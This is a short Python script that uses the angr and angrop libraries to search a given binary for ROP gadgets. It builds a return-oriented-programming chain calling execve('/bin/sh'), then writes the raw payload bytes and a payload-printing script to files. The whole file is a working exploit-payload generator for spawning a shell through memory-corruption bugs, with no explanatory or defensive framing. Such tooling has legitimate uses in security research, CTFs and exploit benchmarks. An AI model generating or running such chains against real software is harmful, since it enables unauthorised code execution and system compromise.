from angr import Project
import angrop
import sys
from io import StringIO
from multiprocessing import cpu_count

binary = sys.argv[1]
ropchain_path = sys.argv[2]

project = Project(binary)
rop = project.analyses.ROP()
rop.find_gadgets_single_threaded(show_progress=False)
chain = rop.execve(b"/bin/sh\x00")

script_path = "{}.angrop.script".format(binary)
with open(script_path, 'w') as script:
    stdout = sys.stdout
    sys.stdout = StringIO()
    chain.print_payload_code()
    output = sys.stdout.getvalue()
    sys.stdout = stdout
    script.write(output)

with open(ropchain_path, 'wb') as ropchain_f:
    payload = chain.payload_str()
    ropchain_f.write(payload)
